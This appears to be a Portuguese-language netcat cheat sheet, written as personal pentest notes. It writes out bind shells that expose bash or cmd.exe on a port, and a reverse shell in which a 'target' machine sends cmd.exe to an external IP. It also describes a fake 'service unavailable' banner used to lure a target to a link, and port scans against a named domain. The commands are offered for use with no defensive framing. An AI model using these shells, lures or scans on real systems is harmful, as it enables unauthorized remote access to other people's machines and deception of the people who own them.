#### netcat

nc -vlp 5050 - abrir porta TCP e ficar ouvindo a mesma.
nc -vnlup 5050 - abrir porta UDP e ficar ouvindo a mesma.

nc -vlup 5050 -e /bin/bash - abrir porta com BASH para ser utilizado.
nc -vlup 5050 -e CMD.exe - abrir porta com o PROMPT para ser utilizado.

nc -vnu 192.168.10.116 6060 - conectando na porta UDP
nc -v 192.168.10.116 5005 - conectando na porta TCP

Servidor escutar habilitando tranferência de arquivos via NetCat
-----------------------------------------------------------------

nc -lvp 1234 > netcatfile ( Servidor que está escutando na porta 1234, tem a transferencia de arquivos habilitada )

nc 192.168.10.110 1234 < arquivo.txt ( Client enviando o arquivo.txt para o servidor que está escutando na porta 1234 )


--------


server = nc -vlp 3000

alvo = nc 187.114.22.246 3000 -e C:\\Windows\\system32\\cmd.exe


---


- Pegar informações usando EngSoc. Primeiro criar um serviço na porta 80.

		nc -vlnp 80

- Ou criar um serviço com um Banner para enganar o alvo. (Ex:Server fora do ar)
	
		echo "Serviço temporariamente indisponivel" > banner
		cat banner
		nc -vlnp 80 < banner

fazer o alvo acessar um link que cai no IP externo de onde a porta 80 esta aberta.
	
		200.177.200.3:80


---



#### Port Scanning com netcat


- Verificar se a porta de um determinado host está aberta

		nc -vnz 192.168.101.103 3306

		nc -vnz farsoft.com.br 80

		nc -vnz farsoft.com.br 80